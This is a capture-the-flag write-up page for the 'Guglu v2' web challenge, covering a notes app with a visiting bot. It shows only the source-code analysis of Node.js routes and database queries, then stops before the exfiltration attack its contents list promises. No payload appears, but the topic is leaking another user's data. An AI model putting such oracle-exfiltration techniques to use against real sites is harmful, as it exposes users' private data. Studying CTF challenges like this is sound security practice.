<!doctype html><html lang="en"><head><title>Guglu v2 | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HackOn CTF 2024. Data exfiltration by oracle"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HackOn CTF 2024. Data exfiltration by oracle"><meta itemprop="keywords" content><meta itemprop="name" content="Guglu v2"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HackOn CTF 2024. Data exfiltration by oracle"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Guglu v2"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/hackon-ctf/guglu-v2/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HackOn CTF 2024. Data exfiltration by oracle"><meta name="twitter:description" content="HackOn CTF 2024. Data exfiltration by oracle"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="Guglu v2"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/hackon-ctf/guglu-v2/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/hackon-ctf/guglu-v2/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HACKON CTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/hackon-ctf/guglu-v2/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/hackon-ctf/guglu-v2/&amp;text=Guglu%20v2" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/hackon-ctf/guglu-v2/&amp;title=Guglu%20v2" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Guglu v2</h1><p class="mb4 f6 dib tracked">8 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#bot">Bot</a></li></ul></li><li><a href="#exfiltration-strategy">Exfiltration strategy</a><ul><li><a href="#intended-approach">Intended approach</a></li><li><a href="#verification">Verification</a></li><li><a href="#implementation">Implementation</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are provided with a website to create notes. There is also a bot that accesses its profile and then accesses to a URL provided by us. We also have the projects in Node.js.</p><h2 id="source-code-analysis">Source code analysis</h2><p>Registration functions (<code>/register</code>) and login (<code>/login</code>) are correctly implemented.</p><p>The main functionality of the application is the possibility of creating and looking for notes (<code>web/src/routes/post.router.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/posts'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">page</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">query</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">page</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk6">undefined</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/posts?page=1'</span><span class="mtk1">)</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">owner</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.username;</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> db.</span><span class="mtk8">getPosts</span><span class="mtk1">(</span><span class="mtk1">owner</span><span class="mtk1">, </span><span class="mtk1">page</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">'posts'</span><span class="mtk1">, {</span>
<span class="mtk1">    </span><span class="mtk1">posts</span><span class="mtk1">: </span><span class="mtk1">posts</span><span class="mtk1">,</span>
<span class="mtk1">  });</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/add-post'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> { </span><span class="mtk1">title</span><span class="mtk1">, </span><span class="mtk1">content</span><span class="mtk1">, </span><span class="mtk1">logo</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">creator</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.username;</span>

<span class="mtk1">  </span><span class="mtk1">title</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">title</span><span class="mtk1">.length </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">256</span>
<span class="mtk1">    </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk1">title</span>
<span class="mtk1">    </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk1">title</span><span class="mtk1">.</span><span class="mtk8">substring</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">256</span><span class="mtk1">);</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk1">content</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">content</span><span class="mtk1">.length </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">1024</span>
<span class="mtk1">    </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk1">content</span>
<span class="mtk1">    </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk1">content</span><span class="mtk1">.</span><span class="mtk8">substring</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">1024</span><span class="mtk1">);   </span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">id</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> db.</span><span class="mtk8">addPost</span><span class="mtk1">(</span><span class="mtk1">title</span><span class="mtk1">, </span><span class="mtk1">content</span><span class="mtk1">, </span><span class="mtk1">logo</span><span class="mtk1">, </span><span class="mtk1">creator</span><span class="mtk1">)[</span><span class="mtk4">"lastInsertRowid"</span><span class="mtk1">];</span>  

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">`/post/</span><span class="mtk5">${</span><span class="mtk1">id</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/search'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">query</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">query</span><span class="mtk1">[</span><span class="mtk4">"query"</span><span class="mtk1">] </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">creator</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.username;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">query</span><span class="mtk1">[</span><span class="mtk4">"page"</span><span class="mtk1">] </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> db.</span><span class="mtk8">searchPosts</span><span class="mtk1">(</span><span class="mtk1">query</span><span class="mtk1">, </span><span class="mtk1">creator</span><span class="mtk1">, </span><span class="mtk1">page</span><span class="mtk1">);</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"posts"</span><span class="mtk1">, {</span>
<span class="mtk1">    </span><span class="mtk1">posts</span><span class="mtk1">: </span><span class="mtk1">posts</span><span class="mtk1">,</span>
<span class="mtk1">  });</span>
<span class="mtk1">})</span>
</code></pre></div><p>These three endpoints use database access functions (<code>web/src/lib/db.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">addPost</span><span class="mtk1">(</span><span class="mtk9 mtki">title</span><span class="mtk1">, </span><span class="mtk9 mtki">content</span><span class="mtk1">, </span><span class="mtk9 mtki">logo</span><span class="mtk1">, </span><span class="mtk9 mtki">creator</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"INSERT INTO posts (title, content, logo, creator)</span><span class="mtk4"> VALUES (?, ?, ?, ?);"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">post_id</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">title</span><span class="mtk1">, </span><span class="mtk9 mtki">content</span><span class="mtk1">, </span><span class="mtk9 mtki">logo</span><span class="mtk1">, </span><span class="mtk9 mtki">creator</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">post_id</span><span class="mtk1">;</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">getPost</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">, </span><span class="mtk9 mtki">creator</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"SELECT title, content, logo FROM posts WHERE id =</span><span class="mtk4"> ? AND creator = ?;"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">, </span><span class="mtk9 mtki">creator</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">getPosts</span><span class="mtk1">(</span><span class="mtk9 mtki">owner</span><span class="mtk1">, </span><span class="mtk9 mtki">page</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">page</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">;</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">owner</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"admin"</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"SELECT id, title, content, logo FROM posts ORDER </span><span class="mtk4">BY title LIMIT 6 OFFSET ?;"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk1">offset</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"SELECT id, title, content, logo FROM posts WHERE </span><span class="mtk4">creator = ? ORDER BY title LIMIT 6 OFFSET ?;"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk9 mtki">owner</span><span class="mtk1">, </span><span class="mtk1">offset</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">searchPosts</span><span class="mtk1">(</span><span class="mtk9 mtki">query</span><span class="mtk1">, </span><span class="mtk9 mtki">owner</span><span class="mtk1">, </span><span class="mtk9 mtki">page</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">page</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">owner</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"admin"</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"SELECT id, title, content, logo FROM posts WHERE </span><span class="mtk4">title LIKE ? ORDER BY title LIMIT 6 OFFSET ?;"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk4">`%</span><span class="mtk5">${</span><span class="mtk9 mtki">query</span><span class="mtk5">}</span><span class="mtk4">%`</span><span class="mtk1">, </span><span class="mtk1">offset</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"SELECT id, title, content, logo FROM posts WHERE </span><span class="mtk4">title LIKE ? and creator = ? ORDER BY title LIMIT </span><span class="mtk4">6 OFFSET ?;"</span><span class="mtk1">);</span>  
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk4">`%</span><span class="mtk5">${</span><span class="mtk9 mtki">query</span><span class="mtk5">}</span><span class="mtk4">%`</span><span class="mtk1">, </span><span class="mtk9 mtki">owner</span><span class="mtk1">, </span><span class="mtk1">offset</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1">;       </span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>There is no SQL injection vulnerability. On the other hand, the flag is stored in the database and belongs to the <code>admin</code> user (the bot):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">
